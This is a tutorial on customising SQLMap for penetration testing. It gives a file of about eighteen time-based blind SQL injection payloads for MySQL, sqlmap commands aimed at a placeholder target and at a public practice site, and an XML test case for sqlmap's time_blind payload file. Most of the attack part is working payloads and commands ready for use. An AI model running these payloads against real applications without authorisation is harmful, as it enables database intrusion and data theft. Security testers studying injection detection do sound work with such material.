
# SQLMap Custom Payload Guide

SQLmap is a powerful tool, and customizing it with your own payloads can enhance your penetration testing efforts. This guide will walk you through creating custom payloads and using them effectively.

## Step 1: Create a Custom Payload File

First, compile all your desired payloads into a file named `custom_payloads.txt`. Below is an example of the file content:

### `custom_payloads.txt`
```sql
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
0'XOR(if(now()=sysdate(),sleep(2),0))XOR'Z
0'XOR(if(now()=sysdate(),sleep(1),0))XOR'Z
if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"*/
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/
if(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'"XOR(if(now()=sysdate(),sleep(9),0))OR"*/
if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'"XOR(if(now()=sysdate(),sleep(6),0))OR"*/
if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"*/
if(now()=sysdate(),sleep(5),0)/*'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0))OR"*/
Hurlburt'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
'XOR(if(now()=sysdate(),sleep(5*5),0))OR' -- -useragent
'+(select*from(select(sleep(7*7)))a)+'
'+(select*from(select(sleep(20)))a)+'
'+(select*from(select(sleep(20+10)))a)+'
XOR(if((select/**/666/**/where/**/[RANDNUM]=[RANDNUM1]),444,0))XOR
XOR(if((select/**/666/**/where/**/[RANDNUM]=[RANDNUM]),444,0))XOR
XOR(if((select/**/666/**/where/**/[INFERENCE]),444,0))XOR
```

## Step 2: Use SQLMap with Custom Payloads

Run SQLmap using the following command to test your custom payloads:

```bash
sqlmap -u "http://targetsite.com/vulnerable_page.php?id=1" --dbms=mysql --technique=T --load-payloads=custom_payloads.txt --time-sec=10 --headers="Referer: http://www.google.com/search?hl=en&q=*"
```

### Explanation of Parameters

- **--load-payloads=custom_payloads.txt**: Specifies the custom payload file.
- **--time-sec=10**: Sets SQLmap's wait time to 10 seconds.
- **--headers**: Defines headers for the injection test (e.g., `Referer`).

## Step 3: Review the Results

Observe SQLmap's output to identify which payloads succeeded and assess their effectiveness based on the response times.

---

## Advanced Customization

### Locating SQLMap's Configuration Files

SQLMap uses XML files to define payloads. These files might be located in different directories depending on your operating system and installation method.

#### Common Paths

- **Source Installation**: `sqlmap/data/xml/payloads/`
- **Pip Installation**: `~/.local/lib/python3.x/site-packages/sqlmap/`
- **Package Manager**: `/usr/share/sqlmap/data/xml/payloads/`

Use the `find` command to locate specific files, such as `time_blind.xml`:

```bash
find / -name time_blind.xml -type f 2>/dev/null
```

### Building Custom Payloads in XML

To add a new test case, edit the appropriate XML file, such as `time_blind.xml`. Here's an example:

```xml
<test>
    <title>XOR time-based blind (query SLEEP)</title>
    <stype>5</stype>
    <level>1</level>
    <risk>1</risk>
    <clause>1,2,3,8,9</clause>
    <where>1</where>
    <vector>[RANDNUM]'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR'[RANDSTR]</vector>
    <request>
        <payload>[RANDNUM]'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR'[RANDSTR]</payload>
    </request>
    <response>
        <time>[SLEEPTIME]</time>
    </response>
</test>
```

### Running Your Custom Query

Use the following command to execute your custom payload:

```bash
sqlmap -u 'http://testphp.vulnweb.com/listproducts.php?cat=1' --technique=T
```

### Additional Tips

- Add `--proxy=http://127.0.0.1:8080` to inspect requests using a proxy tool.
- Experiment with different risk and level settings for comprehensive testing.

---

## Conclusion

With this guide, you can leverage SQLMap's customization features to perform advanced SQL injection testing tailored to your needs. Explore further options and share your findings to contribute to the security community.
